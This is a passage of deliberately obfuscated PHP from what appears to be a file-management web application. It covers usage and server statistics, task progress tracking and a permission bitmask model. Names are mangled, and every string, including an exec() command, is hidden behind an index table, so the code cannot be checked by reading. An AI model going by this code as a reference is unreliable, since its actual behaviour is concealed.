$¯€¿‹Œğ[$š¸º£¿¸[1781]]) / $¯€¿‹Œğ[$š¸º£¿¸[1781]]; } } public function copyFileStart($²°âàÕ‘, $¼º«‡®‚, $È¸£â”“, $ŸÔ—ÅßÄ, $†°³­ğ, $¶ÊæÛ™¶) { $Ìıà­•í =& $_SERVER[÷åé¼î]; parent::copyFileStart($²°âàÕ‘, $¼º«‡®‚, $È¸£â”“, $ŸÔ—ÅßÄ, $†°³­ğ, $¶ÊæÛ™¶); $ËÁÌ©ËÓ =& $this->task; if ($ËÁÌ©ËÓ[$Ìıà­•í[1897]] == $Ìıà­•í[373]) { $ËÁÌ©ËÓ[$Ìıà­•í[1897]] = $Ìıà­•í[110]; } $this->update(); } public function copyFileEnd($‘å¹å•, $×ë³¼áõ, $»ßå¡Æş, $Àò¥‡Ú, $«‡“Î´À, $í†Ã¦¶À) { $†şŠÍ‰ë =& $_SERVER[÷åé¼î]; $÷ñî°À =& $this->task; $÷ñî°À[$†şŠÍ‰ë[1833]] = $÷ñî°À[$†şŠÍ‰ë[1832]]; $÷ñî°À[$†şŠÍ‰ë[1837]] += $÷ñî°À[$†şŠÍ‰ë[1832]]; $÷ñî°À[$†şŠÍ‰ë[1834]] = $†şŠÍ‰ë[12]; $this->update(); } public function zipEvent($ñ“’ÚşÖ, $‡ãõçÒ», $ïè±¢Êš, $Ôò¾ùÔ´) { $©íÕÔ¹Ê =& $_SERVER[÷åé¼î]; $²ç´ÔÇ´ =& $this->task; $²ç´ÔÇ´[$©íÕÔ¹Ê[1830]] = get_path_this($‡ãõçÒ»); $²ç´ÔÇ´[$©íÕÔ¹Ê[1832]] = $Ôò¾ùÔ´; $²ç´ÔÇ´[$©íÕÔ¹Ê[1833]] = $ïè±¢Êš; $²ç´ÔÇ´[$©íÕÔ¹Ê[1137]] = $ñ“’ÚşÖ == $©íÕÔ¹Ê[1905] ? $©íÕÔ¹Ê[1900] : $©íÕÔ¹Ê[1901]; $²ç´ÔÇ´[$©íÕÔ¹Ê[1834]] = $©íÕÔ¹Ê[12]; $²ç´ÔÇ´[$©íÕÔ¹Ê[828]] = $Ôò¾ùÔ´; $²ç´ÔÇ´[$©íÕÔ¹Ê[1897]] = $©íÕÔ¹Ê[373]; $this->update(); } public function nameParse($ìÛ‚üÒ¼) { $˜ùêŒÑ° =& $_SERVER[÷åé¼î]; $‡ıŒğ×” =& $this->task; if ($‡ıŒğ×”[$˜ùêŒÑ°[1780]] < $‡ıŒğ×”[$˜ùêŒÑ°[1135]]) { $£ÒùÚ²Ü = get_path_this($ìÛ‚üÒ¼); if (strstr($£ÒùÚ²Ü, $˜ùêŒÑ°[10])) { $‡ıŒğ×”[$˜ùêŒÑ°[1780]] += 1; } } if ($‡ıŒğ×”[$˜ùêŒÑ°[1897]] == $˜ùêŒÑ°[1273]) { $‡ıŒğ×”[$˜ùêŒÑ°[1897]] = $˜ùêŒÑ°[373]; } $‡ıŒğ×”[$˜ùêŒÑ°[1830]] = $ìÛ‚üÒ¼; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($²•‚åÖ˜) { $¾úÁŸÈà =& $_SERVER[÷åé¼î]; $áÌ­ïÚÖ = array($¾úÁŸÈà[646] => array($¾úÁŸÈà[33] => $¾úÁŸÈà[1906], $¾úÁŸÈà[334] => array($¾úÁŸÈà[255], $¾úÁŸÈà[830], $¾úÁŸÈà[1907], $¾úÁŸÈà[1908])), $¾úÁŸÈà[1909] => array($¾úÁŸÈà[33] => $¾úÁŸÈà[1910], $¾úÁŸÈà[334] => array($¾úÁŸÈà[255], $¾úÁŸÈà[828], $¾úÁŸÈà[1911], $¾úÁŸÈà[1912], $¾úÁŸÈà[1913]))); if (!isset($áÌ­ïÚÖ[$²•‚åÖ˜])) { return !1; } $this->optionType = $áÌ­ïÚÖ[$²•‚åÖ˜][$¾úÁŸÈà[33]]; $this->field = $áÌ­ïÚÖ[$²•‚åÖ˜][$¾úÁŸÈà[334]]; return !0; } public function listData($îÖÔÔ´Œ = false, $ñ°“—Ñ = "\155\x6f\x64\151\x66\x79\124\x69\x6d\145", $ö½††¡Ä = false) { return parent::listData($îÖÔÔ´Œ, $ñ°“—Ñ, $ö½††¡Ä); } public function trendList($Ä×çëã) { $¦Ú–„çé =& $_SERVER[÷åé¼î]; $²ö²¥”Î = $this->listData(); if ($²ö²¥”Î) { $Ì ™ä¬¬ = end($²ö²¥”Î); $ßùÎÜè‚ = date($¦Ú–„çé[1914], strtotime($¦Ú–„çé[1915])); if ($Ì ™ä¬¬[$¦Ú–„çé[255]] == $ßùÎÜè‚) { return $²ö²¥”Î; } $òå÷»ı = strtotime($Ì ™ä¬¬[$¦Ú–„çé[255]]); } if (!isset($òå÷»ı)) { $€ÈïúÛ¤ = $Ä×çëã == $¦Ú–„çé[646] ? $¦Ú–„çé[582] : $¦Ú–„çé[889]; $òå÷»ı = Model($€ÈïúÛ¤)->min($¦Ú–„çé[231]); } $ü ä˜£½ = $¦Ú–„çé[1916] . ucfirst($Ä×çëã); $ÎÎåƒˆé = $this->dateList($òå÷»ı); foreach ($ÎÎåƒˆé as $ßùÎÜè‚) { $this->{$ü ä˜£½}($ßùÎÜè‚); } return $this->listData(); } private function dateList($†ßüê†Ú) { $æÓ¯ÈÈë =& $_SERVER[÷åé¼î]; $¯ªúñ = $†ßüê†Ú; $ø«‚¬ì– = strtotime($æÓ¯ÈÈë[1915]); $¨´ õÅ· = array(); while ($¯ªúñ <= $ø«‚¬ì–) { $¨´ õÅ·[] = date($æÓ¯ÈÈë[1914], $¯ªúñ); $¯ªúñ = strtotime($æÓ¯ÈÈë[1917], $¯ªúñ); } return $¨´ õÅ·; } public function _recordUser($ï·ºÜ¹ = '') { $Öƒ¹¾¿® =& $_SERVER[÷åé¼î]; $ì°ºß¹ = strtotime(date($Öƒ¹¾¿®[1918], strtotime($ï·ºÜ¹))); $ÒÒ†Êå = strtotime(date($Öƒ¹¾¿®[1919], strtotime($ï·ºÜ¹))); $£èºÇ¢Ö = array($Öƒ¹¾¿®[231] => array($Öƒ¹¾¿®[1085], $ÒÒ†Êå)); $ÂãÔ—» = Model($Öƒ¹¾¿®[582])->where($£èºÇ¢Ö)->count($Öƒ¹¾¿®[1779]); $£èºÇ¢Ö[$Öƒ¹¾¿®[231]] = array($Öƒ¹¾¿®[393], array($ì°ºß¹, $ÒÒ†Êå)); $Å¾’¢ûô = Model($Öƒ¹¾¿®[582])->where($£èºÇ¢Ö)->count($Öƒ¹¾¿®[1779]); $£èºÇ¢Ö[$Öƒ¹¾¿®[33]] = $Öƒ¹¾¿®[1920]; $–µå°¯ö = Model($Öƒ¹¾¿®[1921])->where($£èºÇ¢Ö)->count($Öƒ¹¾¿®[1922]); $ïû·İÉÛ = array($Öƒ¹¾¿®[255] => $ï·ºÜ¹, $Öƒ¹¾¿®[830] => (int) $ÂãÔ—», $Öƒ¹¾¿®[1907] => (int) $Å¾’¢ûô, $Öƒ¹¾¿®[1908] => (int) $–µå°¯ö); return $this->insert($ïû·İÉÛ); } public function _recordStore($±ÅÓé£× = '') { $ŒÓÛù‘ =& $_SERVER[÷åé¼î]; $á–«ÈÇü = strtotime(date($ŒÓÛù‘[1919], strtotime($±ÅÓé£×))); $çÌ‚Ô½¼ = array($ŒÓÛù‘[231] => array($ŒÓÛù‘[1085], $á–«ÈÇü)); $İ¹¢çß = Model($ŒÓÛù‘[528])->where($çÌ‚Ô½¼)->sum($ŒÓÛù‘[79]); $çÌ‚Ô½¼[$ŒÓÛù‘[469]] = 0; $Õ¨¬ò÷š = Model($ŒÓÛù‘[889])->where($çÌ‚Ô½¼)->sum($ŒÓÛù‘[79]); $çÌ‚Ô½¼[$ŒÓÛù‘[190]] = 1; $º§¯Ÿä = Model($ŒÓÛù‘[889])->where($çÌ‚Ô½¼)->sum($ŒÓÛù‘[79]); $çÌ‚Ô½¼[$ŒÓÛù‘[190]] = 2; $‚µø¾‘ = Model($ŒÓÛù‘[889])->where($çÌ‚Ô½¼)->sum($ŒÓÛù‘[79]); $ä°Ÿ„é = array($ŒÓÛù‘[255] => $±ÅÓé£×, $ŒÓÛù‘[828] => (int) $Õ¨¬ò÷š, $ŒÓÛù‘[1911] => (int) $İ¹¢çß, $ŒÓÛù‘[1912] => (int) $º§¯Ÿä, $ŒÓÛù‘[1913] => (int) $‚µø¾‘); return $this->insert($ä°Ÿ„é); } public function trend($—œ‘‹º¨, $Ì·ò½¿) { $©½Òº„¾ =& $_SERVER[÷åé¼î]; if (!$this->init($—œ‘‹º¨)) { return !1; } $ĞÄÜŒë = $this->trendList($—œ‘‹º¨); if ($ĞÄÜŒë && $Ì·ò½¿ != $©½Òº„¾[1752]) { $¯‰™Å¹ş = $ĞÄÜŒë[0][$©½Òº„¾[255]]; $ÅòàƒĞ = $this->validDate($Ì·ò½¿, $¯‰™Å¹ş); $òŸ¯İÂÕ = array(); $‘ôüëç¶ = array_to_keyvalue($ĞÄÜŒë, $©½Òº„¾[255]); foreach ($ÅòàƒĞ as $½µ˜Å›) { if (isset($‘ôüëç¶[$½µ˜Å›])) { $¹Øéõ­Ş = $‘ôüëç¶[$½µ˜Å›]; } else { $¹Øéõ­Ş = end($ĞÄÜŒë); $¹Øéõ­Ş[$©½Òº„¾[255]] = $½µ˜Å›; if ($—œ‘‹º¨ == $©½Òº„¾[646]) { $¹Øéõ­Ş[$©½Òº„¾[1907]] = $¹Øéõ­Ş[$©½Òº„¾[1908]] = 0; } } $òŸ¯İÂÕ[] = $¹Øéõ­Ş; } $ĞÄÜŒë = $òŸ¯İÂÕ; } $Ş¢œãñ® = array($©½Òº„¾[646] => array($©½Òº„¾[830] => LNG($©½Òº„¾[1923]), $©½Òº„¾[1907] => LNG($©½Òº„¾[1924]), $©½Òº„¾[1908] => LNG($©½Òº„¾[1925])), $©½Òº„¾[1909] => array($©½Òº„¾[828] => LNG($©½Òº„¾[1926]), $©½Òº„¾[1911] => LNG($©½Òº„¾[1927]), $©½Òº„¾[1912] => LNG($©½Òº„¾[1928]), $©½Òº„¾[1913] => LNG($©½Òº„¾[1929]))); $Í’£²¾÷ = array($©½Òº„¾[646] => $©½Òº„¾[1930], $©½Òº„¾[1909] => $©½Òº„¾[79]); if (empty($ĞÄÜŒë)) { $½µ˜Å› = date($©½Òº„¾[1914], strtotime($©½Òº„¾[1915])); $é¸Ù»ÀË = array($©½Òº„¾[255] => $½µ˜Å›); foreach ($Ş¢œãñ®[$—œ‘‹º¨] as $©“˜ËÃ => $Ó•¹ã«ê) { $é¸Ù»ÀË[$©“˜ËÃ] = 0; } $ĞÄÜŒë[] = $é¸Ù»ÀË; } $Û·ÅËæØ = array(); foreach ($ĞÄÜŒë as $Ó•¹ã«ê) { if ($—œ‘‹º¨ == $©½Òº„¾[1909] && $Ó•¹ã«ê[$©½Òº„¾[1911]] > $Ó•¹ã«ê[$©½Òº„¾[828]]) { $Ó•¹ã«ê[$©½Òº„¾[1911]] = $Ó•¹ã«ê[$©½Òº„¾[828]]; } foreach ($Ş¢œãñ®[$—œ‘‹º¨] as $©“˜ËÃ => $µëÆ¼‘ô) { $¹Øéõ­Ş = array($©½Òº„¾[255] => $Ó•¹ã«ê[$©½Òº„¾[255]], $©½Òº„¾[1668] => $µëÆ¼‘ô); $¹Øéõ­Ş[$Í’£²¾÷[$—œ‘‹º¨]] = isset($Ó•¹ã«ê[$©“˜ËÃ]) ? $Ó•¹ã«ê[$©“˜ËÃ] : 0; $Û·ÅËæØ[] = $¹Øéõ­Ş; } } return $Û·ÅËæØ; } public function validDate($ŠìÁèÛİ, $¹Ê·Š·) { $á¤•½¸ =& $_SERVER[÷åé¼î]; $Ÿ“íâª¼ = date($á¤•½¸[1914], strtotime($á¤•½¸[1915])); $ïµ‚é‚¨ = array($Ÿ“íâª¼); switch ($ŠìÁèÛİ) { case $á¤•½¸[1759]: $Ø§¿Å› = mktime(0, 0, 0, date($á¤•½¸[1931]), date($á¤•½¸[1446]) - date($á¤•½¸[1539]) + 7 - 7, date($á¤•½¸[1932])); $«¶À½–± = 0; do { $±»Ú¢ÑÊ = date($á¤•½¸[1914], $Ø§¿Å› - 3600 * 24 * 7 * $«¶À½–±); $ïµ‚é‚¨[] = $±»Ú¢ÑÊ; $«¶À½–±++; } while ($¹Ê·Š· < $±»Ú¢ÑÊ); break; case $á¤•½¸[1757]: $«¶À½–± = 1; do { $Æ‰¥Û‚ = date($á¤•½¸[1933], strtotime("\x2d\x20{$«¶À½–±}\x20\x6d\157\x6e\164\150\163")); $ïµ‚é‚¨[] = $Æ‰¥Û‚; $«¶À½–±++; } while ($¹Ê·Š· < $Æ‰¥Û‚); break; case $á¤•½¸[1934]: $Ğ‚Í“óˆ = (int) date($á¤•½¸[1932], strtotime($¹Ê·Š·)); $Ï§ÒŸš‘ = (int) date($á¤•½¸[1932]); if ($Ğ‚Í“óˆ >= $Ï§ÒŸš‘) { break; } for ($Ğ‚Í“óˆ; $Ğ‚Í“óˆ < $Ï§ÒŸš‘; $Ğ‚Í“óˆ++) { $ïµ‚é‚¨[] = $Ğ‚Í“óˆ . $á¤•½¸[1935]; } break; default: break; } if ($¹Ê·Š· > end($ïµ‚é‚¨)) { array_pop($ïµ‚é‚¨); } sort($ïµ‚é‚¨); return $ïµ‚é‚¨; } public function listTable($ı˜ƒ˜——) { $´ƒ—Ù = ucfirst($ı˜ƒ˜——); return Model($´ƒ—Ù)->listData(); } public function option($‹™„ØÒ­) { $ÊĞá×ÒÆ = $_SERVER[÷åé¼î][1936] . ucfirst($‹™„ØÒ­); return $this->{$ÊĞá×ÒÆ}(); } private function optionUser() { $ô³ûïÕÑ =& $_SERVER[÷åé¼î]; $ã‚“ùœÀ = Model($ô³ûïÕÑ[582])->count($ô³ûïÕÑ[1779]); $¸çŞ¬» = Model($ô³ûïÕÑ[582])->where($ô³ûïÕÑ[1937])->count($ô³ûïÕÑ[1779]); $—Ô¹¢‘× = intval($GLOBALS[$ô³ûïÕÑ[6]][$ô³ûïÕÑ[409]][$ô³ûïÕÑ[1725]]) / 3600; $ Ó‚–Ò‘ = strtotime("\x2d{$—Ô¹¢‘×}\x20\150\157\165\162\x73"); $½şòÉİı = strtotime(date($ô³ûïÕÑ[1918])); if ($ Ó‚–Ò‘ < $½şòÉİı) { $ Ó‚–Ò‘ = $½şòÉİı; } $„Å¨»•ú = array($ô³ûïÕÑ[1938] => array($ô³ûïÕÑ[1086], $ Ó‚–Ò‘)); $¹½Ñİìç = (int) Model($ô³ûïÕÑ[582])->where($„Å¨»•ú)->count($ô³ûïÕÑ[1779]); if (!$¹½Ñİìç) { $¹½Ñİìç = 1; } $„Å¨»•ú = array($ô³ûïÕÑ[1938] => array($ô³ûïÕÑ[1086], $½şòÉİı)); $åô„ŒŞ¾ = Model($ô³ûïÕÑ[582])->where($„Å¨»•ú)->count($ô³ûïÕÑ[1779]); return array($ô³ûïÕÑ[823] => (int) $ã‚“ùœÀ, $ô³ûïÕÑ[1939] => (int) ($ã‚“ùœÀ - $¸çŞ¬»), $ô³ûïÕÑ[1940] => (int) $¸çŞ¬», $ô³ûïÕÑ[1941] => (int) $åô„ŒŞ¾, $ô³ûïÕÑ[1942] => $¹½Ñİìç); } private function optionFile() { $®‹ğÏŸÛ =& $_SERVER[÷åé¼î]; $‡¼Û»õÔ = $this->sourceSize(); $Ø®­‹©Ö = $‡¼Û»õÔ[$®‹ğÏŸÛ[79]]; $„ø¯¹ùé = $‡¼Û»õÔ[$®‹ğÏŸÛ[1911]]; $‚êÙ²˜¹ = Model($®‹ğÏŸÛ[889])->where(array($®‹ğÏŸÛ[469] => 0))->count($®‹ğÏŸÛ[193]); $™Æ· œô = array($®‹ğÏŸÛ[469] => 0, $®‹ğÏŸÛ[231] => array($®‹ğÏŸÛ[1086], strtotime(date($®‹ğÏŸÛ[1918])))); $«©¡á¬ = Model($®‹ğÏŸÛ[889])->where($™Æ· œô)->sum($®‹ğÏŸÛ[79]); $ªç¢€ğú = Model($®‹ğÏŸÛ[889])->where($™Æ· œô)->count($®‹ğÏŸÛ[193]); return array($®‹ğÏŸÛ[828] => $Ø®­‹©Ö, $®‹ğÏŸÛ[1911] => $„ø¯¹ùé, $®‹ğÏŸÛ[1943] => $Ø®­‹©Ö - $„ø¯¹ùé, $®‹ğÏŸÛ[1944] => (int) $«©¡á¬, $®‹ğÏŸÛ[830] => (int) $‚êÙ²˜¹, $®‹ğÏŸÛ[1945] => (int) $ªç¢€ğú); } private function optionAccess() { $ÓşÖ‹™å =& $_SERVER[÷åé¼î]; return array($ÓşÖ‹™å[823] => $this->typeLogCnt(), $ÓşÖ‹™å[110] => $this->typeLogCnt($ÓşÖ‹™å[110]), $ÓşÖ‹™å[509] => $this->typeLogCnt($ÓşÖ‹™å[509]), $ÓşÖ‹™å[1946] => $this->typeLogCnt($ÓşÖ‹™å[1946]), $ÓşÖ‹™å[1947] => $this->typeLogCnt($ÓşÖ‹™å[1947]), $ÓşÖ‹™å[646] => $this->typeLogCnt($ÓşÖ‹™å[12], $ÓşÖ‹™å[1922])); } private function typeLogCnt($¡¤û¼üÙ = '', $ÛªÁìó = "\151\144") { $èœ¥ˆùŞ =& $_SERVER[÷åé¼î]; $âÓ¾§½Ğ = array($èœ¥ˆùŞ[110] => array($èœ¥ˆùŞ[1948], $èœ¥ˆùŞ[1949]), $èœ¥ˆùŞ[509] => array($èœ¥ˆùŞ[1950], $èœ¥ˆùŞ[1951]), $èœ¥ˆùŞ[1946] => array($èœ¥ˆùŞ[1952], $èœ¥ˆùŞ[1953], $èœ¥ˆùŞ[1954]), $èœ¥ˆùŞ[1947] => array($èœ¥ˆùŞ[1955], $èœ¥ˆùŞ[1956]), $èœ¥ˆùŞ[1957] => array($èœ¥ˆùŞ[1958], $èœ¥ˆùŞ[1959], $èœ¥ˆùŞ[1960])); $¤Şá®£› = strtotime(date($èœ¥ˆùŞ[1918])); $†ì¤§è‰ = array($èœ¥ˆùŞ[231] => array($èœ¥ˆùŞ[1086], $¤Şá®£›)); if ($¡¤û¼üÙ) { $†ì¤§è‰[$èœ¥ˆùŞ[33]] = array($èœ¥ˆùŞ[7], $âÓ¾§½Ğ[$¡¤û¼üÙ]); } $ø˜²ª¨Ä = Model($èœ¥ˆùŞ[1921])->where($†ì¤§è‰)->count($ÛªÁìó); return (int) $ø˜²ª¨Ä; } private function optionServer() { $§§Ä Ü =& $_SERVER[÷åé¼î]; $ŸñúŞ¸Ç = $this->diskDriver(); $Ò†ÑéªÅ = KodIO::defaultDriver(); $÷«ŒÒÂ = array($§§Ä Ü[882] => $Ò†ÑéªÅ[$§§Ä Ü[459]]); $õ™¢µÅĞ = Model($§§Ä Ü[528])->where($÷«ŒÒÂ)->sum($§§Ä Ü[79]); $í§şœ‡Ä = explode($§§Ä Ü[53], $_SERVER[$§§Ä Ü[147]]); $÷Î™ÊïÃ = $í§şœ‡Ä[0]; $Š¸¥ËÚ  = $GLOBALS[$§§Ä Ü[6]][$§§Ä Ü[21]]; $é©ş–Â = $Š¸¥ËÚ [$§§Ä Ü[1048]]; if ($é©ş–Â == $§§Ä Ü[1036]) { $ÃÉ‹Æ— = explode($§§Ä Ü[1362], $Š¸¥ËÚ [$§§Ä Ü[1047]]); $é©ş–Â = $ÃÉ‹Æ—[0]; } if ($é©ş–Â == $§§Ä Ü[984] || $é©ş–Â == $§§Ä Ü[869]) { $ûÒñ€­‚ = Model()->db()->query($§§Ä Ü[1961]); $®”ö‹„Ñ = $ûÒñ€­‚[0] && isset($ûÒñ€­‚[0][$§§Ä Ü[1667]]) ? $ûÒñ€­‚[0][$§§Ä Ü[1667]] : 0; $é©ş–Â = $§§Ä Ü[1962] . ($®”ö‹„Ñ ? $§§Ä Ü[8] . $®”ö‹„Ñ : $§§Ä Ü[12]); } $€±Ì¶º = $GLOBALS[$§§Ä Ü[6]][$§§Ä Ü[409]][$§§Ä Ü[891]]; return array($§§Ä Ü[1963] => $ŸñúŞ¸Ç ? $ŸñúŞ¸Ç[$§§Ä Ü[1964]] : 0, $§§Ä Ü[1965] => $ŸñúŞ¸Ç ? $ŸñúŞ¸Ç[$§§Ä Ü[1966]] : 0, $§§Ä Ü[1967] => (int) $Ò†ÑéªÅ[$§§Ä Ü[1964]] * 1024 * 1024 * 1024, $§§Ä Ü[1968] => (int) $õ™¢µÅĞ, $§§Ä Ü[1969] => ucfirst($÷Î™ÊïÃ), $§§Ä Ü[1970] => $§§Ä Ü[1971] . PHP_VERSION, $§§Ä Ü[1972] => phpBuild64() ? 64 : 32, $§§Ä Ü[822] => str_replace($§§Ä Ü[1205], $§§Ä Ü[1064], $é©ş–Â), $§§Ä Ü[409] => ucfirst($€±Ì¶º), $§§Ä Ü[32] => $_SERVER[$§§Ä Ü[1973]]); } private function diskDriver() { $üĞ’« =& $_SERVER[÷åé¼î]; $âö¤û» = $üĞ’«[8]; $Ğ„¬–ç = $GLOBALS[$üĞ’«[6]][$üĞ’«[1379]] == $üĞ’«[1380]; if ($Ğ„¬–ç) { $âö¤û» = $üĞ’«[1974]; if (function_exists($üĞ’«[1975])) { exec($üĞ’«[1976], $µÎÜòàŞ); $âö¤û» = $µÎÜòàŞ[1] . $üĞ’«[8]; } } if (!file_exists($âö¤û»)) { return; } $Âî©ïİÍ = @disk_total_space($âö¤û»); $€ â—ˆ‰ = $Âî©ïİÍ - @disk_free_space($âö¤û»); return array($üĞ’«[1964] => $Âî©ïİÍ, $üĞ’«[1966] => $€ â—ˆ‰); } public function fileChart($æİ“ö““) { $ùã£ûÈÄ =& $_SERVER[÷åé¼î]; if (isset($æİ“ö““[$ùã£ûÈÄ[1779]])) { return Model($ùã£ûÈÄ[889])->userFileTypeProfile($æİ“ö““[$ùã£ûÈÄ[1779]]); } if (isset($æİ“ö““[$ùã£ûÈÄ[1977]])) { return Model($ùã£ûÈÄ[889])->groupFileTypeProfile($æİ“ö““[$ùã£ûÈÄ[1977]]); } $ÀÔìõÒı = $this->sourceSize(); $Ï¸”ûç× = array($ùã£ûÈÄ[192] => 0, $ùã£ûÈÄ[190] => 1); $ø×ËªÔ¼ = Model($ùã£ûÈÄ[889])->where($Ï¸”ûç×)->sum($ùã£ûÈÄ[79]); $Ï¸”ûç×[$ùã£ûÈÄ[190]] = 2; $´ÓÕ»¸Ú = Model($ùã£ûÈÄ[889])->where($Ï¸”ûç×)->sum($ùã£ûÈÄ[79]); return array($ùã£ûÈÄ[828] => $ÀÔìõÒı[$ùã£ûÈÄ[79]], $ùã£ûÈÄ[1911] => $ÀÔìõÒı[$ùã£ûÈÄ[1911]], $ùã£ûÈÄ[1912] => (int) $ø×ËªÔ¼, $ùã£ûÈÄ[1913] => (int) $´ÓÕ»¸Ú); } private function sourceSize() { $Ş½Çµ»µ =& $_SERVER[÷åé¼î]; $áÚúÙ‘æ = Model($Ş½Çµ»µ[889])->where(array($Ş½Çµ»µ[469] => 0))->sum($Ş½Çµ»µ[79]); $ß¥¾¤À° = Model($Ş½Çµ»µ[528])->sum($Ş½Çµ»µ[79]); if ($ß¥¾¤À° > $áÚúÙ‘æ) { $ß¥¾¤À° = $áÚúÙ‘æ; } return array($Ş½Çµ»µ[79] => (int) $áÚúÙ‘æ, $Ş½Çµ»µ[1911] => (int) $ß¥¾¤À°); } } goto F¬ĞÃ¤ï„×; F¬ĞÃ¤ï„×: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $†Éª‡»Ä =& $_SERVER[÷åé¼î]; $İÙ¼À§ = array(array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1978]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1980], $†Éª‡»Ä[1981] => 1, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1984]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1985], $†Éª‡»Ä[1981] => 2, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1986]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1987], $†Éª‡»Ä[1981] => 3, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1988]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1989], $†Éª‡»Ä[1981] => 4, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_VIEW), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1990]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1991], $†Éª‡»Ä[1981] => 5, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1992]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1993], $†Éª‡»Ä[1981] => 6, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($†Éª‡»Ä[478] => LNG($†Éª‡»Ä[1994]), $†Éª‡»Ä[1979] => $†Éª‡»Ä[1995], $†Éª‡»Ä[1981] => 7, $†Éª‡»Ä[1982] => 1, $†Éª‡»Ä[1983] => 0)); return $İÙ¼À§; } public static function authCheck($ùùçª±Œ, $‹œ°Û·Ó) { $»ĞïŠ›º =& $_SERVER[÷åé¼î]; $ùùçª±Œ = intval($ùùçª±Œ); if (KodUser::isRoot() && $GLOBALS[$»ĞïŠ›º[6]][$»ĞïŠ›º[1996]]) { return !0; } if ($ùùçª±Œ <= 0) { return !1; } if (($ùùçª±Œ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ùùçª±Œ & $‹œ°Û·Ó); } public static function authCheckShow($ùÙµ¥ƒ€) { return self::authCheck($ùÙµ¥ƒ€, self::AUTH_SHOW); } public static function authCheckView($…“·ÛË‚) { return self::authCheck($…“·ÛË‚, self::AUTH_VIEW); } public static function authCheckDownload($™âõ…÷¾) { return self::authCheck($™âõ…÷¾, self::AUTH_DOWNLOAD); } public static function authCheckUpload($İŠÈã±÷) { return self::authCheck($İŠÈã±÷, self::AUTH_UPLOAD); } public static function authCheckEdit($ü€®•Ğı) { return self::authCheck($ü€®•Ğı, self::AUTH_EDIT); } public static function authCheckRemove($“ş“à±¼) { return self::authCheck($“ş“à±¼, self::AUTH_REMOVE); } public static function authCheckShare($ ÄºŒĞš) { return self::authCheck($ ÄºŒĞš, self::AUTH_SHARE); } public static function authCheckComment($àğüÔà±) { return self::authCheck($àğüÔà±, self::AUTH_COMMENT); } public static function authCheckEvent($ºª“ÄŞ•) { return self::authCheck($ºª“ÄŞ•, self::AUTH_EVENT); } public static function authCheckRoot($ÙôğŸ­ø) { return self::authCheck($ÙôğŸ­ø, self::AUTH_ROOT); } public static function authCheckAction($…ÒÌê˜Ì, $÷áşû) { $Âó™Ô¼¶ =& $_SERVER[÷åé¼î]; $¨„Ù“À¹ = array($Âó™Ô¼¶[1997] => self::AUTH_VIEW, $Âó™Ô¼¶[1273] => self::AUTH_DOWNLOAD, $Âó™Ô¼¶[110] => self::AUTH_UPLOAD, $Âó™Ô¼¶[1947] => self::AUTH_EDIT, $Âó™Ô¼¶[1946] => self::AUTH_REMOVE, $Âó™Ô¼¶[1957] => self::AUTH_SHARE, $Âó™Ô¼¶[414] => self::AUTH_COMMENT, $Âó™Ô¼¶[1767] => self::AUTH_EVENT, $Âó™Ô¼¶[1998] => self::AUTH_ROOT); if (!isset($¨„Ù“À¹[$÷áşû])) { return; } $ğÑ·İÁ = $¨„Ù“À¹[$÷áşû]; $…ÒÌê˜Ì = intval($…ÒÌê˜Ì); if ($…ÒÌê˜Ì <= 0) { return !1; } if (($…ÒÌê˜Ì & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($…ÒÌê˜Ì & $ğÑ·İÁ); } public static function authDisable($¿Ë•ş÷, $¢é÷ÚÑ‡) { if (intval($¿Ë•ş÷) <= 0) { return 0; } return intval($¿Ë•ş÷) & ~$¢é÷ÚÑ‡; } public $optionType = "\123\171\163\x74\145\155\56\x73\x6f\x75\162\x63\145\x41\x75\x74\x68\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x61\x75\164\x68", "\x6c\141\142\145\x6c", "\144\x69\163\160\x6c\141\171", "\x73\171\163\164\x65\155", 